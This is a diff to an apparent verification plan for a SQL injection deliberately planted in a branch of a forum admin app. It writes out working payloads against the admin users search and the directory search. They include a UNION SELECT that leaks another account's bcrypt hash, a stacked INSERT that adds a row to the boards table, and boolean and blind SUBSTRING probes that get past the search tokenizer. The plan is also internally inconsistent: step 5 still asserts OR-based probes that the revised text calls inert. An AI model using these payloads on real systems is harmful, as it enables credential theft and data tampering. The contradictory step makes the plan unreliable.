@@ -39,10 +39,17 @@ ORDER BY u.created_at DESC LIMIT 500
 ```
 
 That projection has **11 columns** in this fixed order: `id`, `username`, `email`,
-`password_hash`, `role`, `is_banned`, `ban_reason`, `mfa_enabled`, `created_at`,
-`updated_at`, `post_count`. The rendered table shows `username` (`VARCHAR(50)`)
-and `email` (`VARCHAR(255)`) — a bcrypt hash is 60 characters, so extracted hashes
-go in the **email** slot, not the username slot.
+`role`, `is_banned`, `ban_reason`, `avatar_path`, `mfa_enabled`, `created_at`,
+`updated_at`, `post_count`. `password_hash` is **not** in the projection — which is
+precisely what the UNION payload is for. The rendered table shows `username`
+(`VARCHAR(50)`) and `email` (`VARCHAR(255)`) — a bcrypt hash is 60 characters, so
+extracted hashes go in the **email** slot (position 3), not the username slot.
+
+`post_count` is a column *alias*, not a column: the UNION arm cannot name it, so the
+11th union column repeats a real one (`id`, which is `INT UNSIGNED` like the count).
+The fragment is built on one line, so a `-- ` comment tail reaches the second `LIKE`
+clause and the rest of the statement — the injected value is interpolated **twice**,
+and only the first occurrence survives parsing.
 
 The branch concatenates the search term into the SQL text and passes no parameter
 array. That forces the `LIKE` metacharacter escape to go as well: `main` builds
@@ -101,11 +108,11 @@ Files touched:
 ## Payload sketch
 
 Read a credential the app never renders, into the rendered `email` slot. The
-payload must supply all **11** projection columns, so `post_count` is repeated:
+payload must supply all **11** projection columns in the order above:
 
 ```
 GET /admin/users?q=' UNION SELECT id, username, password_hash, role, is_banned,
-    ban_reason, mfa_enabled, created_at, updated_at, post_count, post_count
+    ban_reason, avatar_path, mfa_enabled, created_at, updated_at, id
     FROM users WHERE username='mod_marcus'-- -
 ```
 
@@ -116,17 +123,29 @@ GET /admin/users?q='; INSERT INTO boards (name, description, default_access)
     VALUES ('pwned-sqli', 'stacked statement proof', 1)-- -
 ```
 
-Boolean probe (no timing, deterministic). The probe has to open the `LIKE`
-wildcard first — a bare `' AND 1=1-- -` collapses to `LIKE ''`, which matches no
-row on either branch and proves nothing:
+Boolean probe (no timing, deterministic). Two shape facts, both verified against
+MariaDB, decide the payload:
+
+- the probe has to open the `LIKE` wildcard first — a bare `' AND 1=1-- -` collapses
+  to `LIKE ''`, which matches no row on either branch and proves nothing;
+- the connector is **`AND`, not `OR`**. Once the wildcard is open, `LIKE '%%'` is
+  already true for every row, so `%' OR 1=2-- -` renders every row on both branches
+  and the pair is inert. `AND` makes the injected predicate decide the result set.
 
 ```
-GET /admin/users?q=%' OR 1=1-- -     -> "All users (10)"
-GET /admin/users?q=%' OR 1=2-- -     -> "All users (0)"
+GET /admin/users?q=%' AND 1=1-- -    -> "All users (10)"   (test DB: 10 personas)
+GET /admin/users?q=%' AND 1=2-- -    -> "All users (0)"
 ```
 
 The heading text `All users (N)` is the string the PHP template renders and the
-Node port must keep, so no new empty-state copy is invented.
+Node port must keep, so no new empty-state copy is invented. `N` counts rendered
+rows: the fixture test database holds exactly the 10 personas, while a dev database
+also carries the `ADMIN_EMAILS` account and therefore renders 11 — pin the pair to
+what `SELECT COUNT(*) FROM users` says in the database under test, and assert that
+number equals 10 so the fixture invariant is part of the evidence.
+
+A third symptom of the same removed control: with `C-SQL-3` gone, `q=%` is a
+wildcard, not a search term, and returns every row on the branch and none on `main`.
 
 Expected effect: the admin users table contains a row whose email cell holds the
 60-character bcrypt hash of another account, and the `boards` table gains a row
@@ -147,9 +166,23 @@ the application never created.
 5. Assert the boolean pair behaves as injected: the `%' OR 1=1-- -` probe renders
    `All users (10)` and the `%' OR 1=2-- -` probe renders `All users (0)`, with the
    same payload prefix in both.
-6. Secondary sink: `GET /directory?q=%' OR 1=1-- -` renders all ten personas, and
-   the 5-column UNION form of the same payload puts `outsider_olly` in a result the
-   role filter should have excluded.
+6. Secondary sink (`src/hooks/directory.js`, 5-column projection). The directory's
+   own tokenizer splits the `q` value on whitespace **and** commas (that is what
+   `C-DIR-2` proves), so a directory payload contains neither: word separators are
+   `/**/` and the comment tail is `#` (which the request must send as `%23`). The
+   5-column UNION form is therefore unreachable through the tokenizer — commas are
+   token separators — and the reachable forms are:
+
+   ```
+   GET /directory?q=%'/**/AND/**/1=1#      -> every persona row
+   GET /directory?q=%'/**/AND/**/1=2#      -> no rows
+   GET /directory?q=%'/**/AND/**/SUBSTRING((SELECT/**/password_hash/**/FROM/**/users
+       /**/WHERE/**/username='outsider_olly'),1,4)='$2b$'#      -> every persona row
+   GET /directory?q=<same probe with '0000' instead of '$2b$'>  -> no rows
+   ```
+
+   The probe pair reads four characters of a stored bcrypt hash for an account the
+   listing never exposes as a column, and the pair — not one request — is the proof.
 7. Assert the guard still works: an anonymous `GET /admin/users?q=<payload>` is a
    `303` to `/login`, so the injection needs a session and the finding is not also
    an access-control break.
@@ -159,7 +192,7 @@ the application never created.
 On `main` every assertion in steps 3-6 must fail: `allUsers` passes the term as a
 bound parameter, so all three payloads are literal search text — step 3 renders
 `All users (0)`, step 4 leaves `boards` at its seeded count, step 5 renders
-`All users (0)` for both probes, and step 6 filters on a token that matches no
+`All users (0)` for both probes, and step 6 filters on tokens that match no
 persona; the explicit `multipleStatements: false` pool rejects step 4's second
 statement even if the first half were interpolated; and `c-sql-3` keeps `'`, `%` and
 `_` literal, which is why the same payloads are inert on `main`. Step 7 (the guard)
